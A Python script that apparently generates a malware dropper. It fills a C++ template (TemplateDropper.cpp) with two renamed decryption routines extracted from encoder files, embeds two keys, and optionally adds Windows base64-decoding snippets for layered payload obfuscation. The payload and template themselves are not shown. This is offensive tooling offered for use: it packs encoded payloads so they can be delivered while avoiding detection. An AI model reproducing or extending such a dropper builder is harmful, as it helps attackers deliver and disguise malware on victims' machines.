import re
BASE64_SNIPPET = r'''BYTE* DecodeBase64Buffer(const char* base64Data, DWORD base64Len, DWORD* outLen) {

    if (!base64Data || base64Len == 0 || !outLen) return NULL;

    DWORD decodedLen = 0;

    BOOL ok = CryptStringToBinaryA(
        base64Data,
        base64Len,
        CRYPT_STRING_BASE64,
        NULL,
        &decodedLen,
        NULL,
        NULL
    );

    if (!ok || decodedLen == 0) return NULL;

    BYTE* out = (BYTE*)malloc(decodedLen);
    if (!out) return NULL;

    ok = CryptStringToBinaryA(
        base64Data,
        base64Len,
        CRYPT_STRING_BASE64,
        out,
        &decodedLen,
        NULL,
        NULL
    );

    if (!ok) {
        free(out);
        return NULL;
    }

    *outLen = decodedLen;
    return out;
}'''
BASE642_SNIPPET = r'''BYTE* buffer = decodedData;     
    DWORD bufferSize = decodedSize;  
    bool USE_BASE64 = true;
    if (USE_BASE64) {
        DWORD b64DecodedSize = 0;

        BYTE* roundtrip = DecodeBase64Buffer(
            (const char*)buffer,
            bufferSize,
            &b64DecodedSize
        );

        if (!roundtrip) {
            wprintf(L"Base64 decode failed\n");
            return;
        }

        // Replace original pointer
        free(buffer);
        buffer = roundtrip;
        bufferSize = b64DecodedSize;
    }'''

# def extract_decrypt_function(file_path, new_name=None):
#     """Extracts the decryptFile function and optionally renames it."""
#     with open(file_path, 'r', encoding='utf-8') as f:
#         code = f.read()

#     pattern = r'void\s+decryptFile\s*\([^)]*\)\s*\{(?:[^{}]|\{[^{}]*\})*\}'
#     match = re.search(pattern, code, re.DOTALL)

#     if not match:
#         return None

#     func_code = match.group(0).strip()

#     if new_name:
#         func_code = re.sub(r'\bdecryptFile\b', new_name, func_code)

#     return func_code
def extract_decrypt_function(file_path, new_name=None):
    """
    Extracts the function 'decryptFile' from a C++ file, including nested braces.
    Optionally renames the function.
    """
    with open(file_path, "r", encoding="utf-8") as f:
        code = f.read()

    # Find function declaration
    func_decl = re.search(r'void\s+decryptFile\s*\([^)]*\)\s*\{', code)
    if not func_decl:
        return None

    start_idx = func_decl.start()
    brace_idx = func_decl.end() - 1  # Position of the first '{'

    # Scan for matching closing brace
    depth = 0
    for i in range(brace_idx, len(code)):
        if code[i] == '{':
            depth += 1
        elif code[i] == '}':
            depth -= 1
            if depth == 0:
                end_idx = i + 1
                break
    else:
        # No matching closing brace found
        return None

    func_code = code[start_idx:end_idx]

    # Rename function if requested
    if new_name:
        func_code = re.sub(r'\bdecryptFile\b', new_name, func_code)

    return func_code
def create_dropper(outpath, encoder1, encoder2, key1, key2,base64 = False):
    template_path = "TemplateDropper.cpp"
    output_path = outpath

    with open(template_path, "r", encoding="utf-8") as f:
        content = f.read()

    dec1 = extract_decrypt_function(encoder1, "decrypt1")
    dec2 = extract_decrypt_function(encoder2, "decrypt2")
    content = content.replace("//define key1", f"#define KEY1 {key1}")
    content = content.replace("//define key2", f"#define KEY2 {key2}")

    content = content.replace("//decodescript1", dec1)
    content = content.replace("//decodescript2", dec2)
    if base64:
        content = content.replace("//base641", BASE64_SNIPPET)
        content = content.replace("//base642",BASE642_SNIPPET)
    with open(output_path, "w", encoding="utf-8") as f:
        f.write(content)